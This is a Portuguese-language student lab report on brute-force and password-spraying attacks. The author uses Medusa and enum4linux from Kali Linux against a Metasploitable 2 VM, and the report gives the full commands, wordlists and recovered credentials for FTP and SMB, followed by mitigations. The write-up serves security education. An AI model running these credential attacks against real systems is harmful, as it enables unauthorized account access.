
# Relatório Técnico – Simulação de Ataques de Força Bruta com Kali Linux e Medusa

## 1. Introdução

Este relatório apresenta a implementação de um laboratório prático de segurança ofensiva utilizando o sistema operacional Kali Linux em conjunto com a máquina vulnerável Metasploitable 2. O objetivo foi compreender, na prática, o funcionamento de ataques de força bruta, enumeração de usuários e password spraying utilizando a ferramenta Medusa.

Os testes foram realizados exclusivamente em ambiente controlado e autorizado, com finalidade educacional e de aprendizado em segurança da informação.

Durante o desenvolvimento do laboratório, foram realizados:
- Ataques de força bruta contra o serviço FTP;
- Enumeração de usuários SMB;
- Password spraying contra o serviço SMB;
- Validação dos acessos obtidos.

O cenário envolvendo DVWA não foi executado porque o acesso ao servidor web foi bloqueado pela rede utilizada no ambiente de testes.

## 2. Objetivos

### Objetivo Geral

Simular ataques de autenticação em serviços vulneráveis para compreender riscos relacionados a senhas fracas e serviços mal configurados.

### Objetivos Específicos

- Configurar um ambiente virtualizado de testes;
- Utilizar o Medusa para automatizar tentativas de login;
- Realizar enumeração de usuários SMB;
- Validar credenciais descobertas;
- Identificar vulnerabilidades relacionadas à autenticação;
- Propor medidas de mitigação.

## 3. Ambiente Utilizado

| Máquina | Sistema Operacional | Função |
|---|---|---|
| Kali Linux | Linux | Máquina atacante |
| Metasploitable 2 | Ubuntu vulnerável | Máquina alvo |

Ferramentas utilizadas:
- Kali Linux
- Metasploitable 2
- VirtualBox
- Medusa
- FTP
- SMB
- enum4linux

## 4. Configuração da Rede

As máquinas virtuais foram configuradas utilizando o modo Host-Only Adapter no VirtualBox.

IP da máquina vulnerável:
192.168.56.101

## 5. Criação das Wordlists

Usuários FTP:
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Senhas FTP:
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

## 6. Ataque de Força Bruta em FTP

Comando incorreto:
medusa -h 192.168.56.101 -U users.txt -P pass.txt-M ftp -t 6

Mensagem:
You must specify a module to execute using -M MODULE_NAME

Comando corrigido:
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

Resultado:
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

## 7. Validação do Acesso FTP

Comando:
ftp 192.168.56.101

Resultado:
230 Login successful.

## 8. Enumeração SMB com enum4linux

Comando:
enum4linux -a 192.168.56.101 | tee enum4_output.txt

Usuários identificados:
- msfadmin
- root
- user
- service
- postgres
- mysql
- ftp
- tomcat55

## 9. Password Spraying em SMB

Usuários:
echo -e 'user\nmsfadmin\nservice' > smb_users.txt

Senhas:
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt

Comando:
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Resultado:
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

## 10. Análise dos Resultados

Os testes demonstraram:
- Uso de senhas fracas;
- Reutilização de credenciais;
- Ausência de políticas de complexidade;
- Falta de bloqueio após múltiplas tentativas;
- Serviços vulneráveis expostos.

## 11. Medidas de Mitigação

- Implementar políticas fortes de senha;
- Utilizar MFA;
- Configurar bloqueio temporário;
- Utilizar SFTP no lugar de FTP;
- Monitorar logs;
- Aplicar limitação de tentativas;
- Atualizar serviços vulneráveis.

## 12. Dificuldades Encontradas

- Erro inicial de sintaxe no Medusa;
- Bloqueio de acesso ao DVWA;
- Ajustes de concorrência no Medusa;
- Interpretação dos resultados SMB.

## 13. Conclusão

O laboratório permitiu compreender, na prática, o funcionamento de ataques de força bruta e password spraying em ambientes vulneráveis. A atividade contribuiu significativamente para o aprendizado em segurança ofensiva e análise de vulnerabilidades.
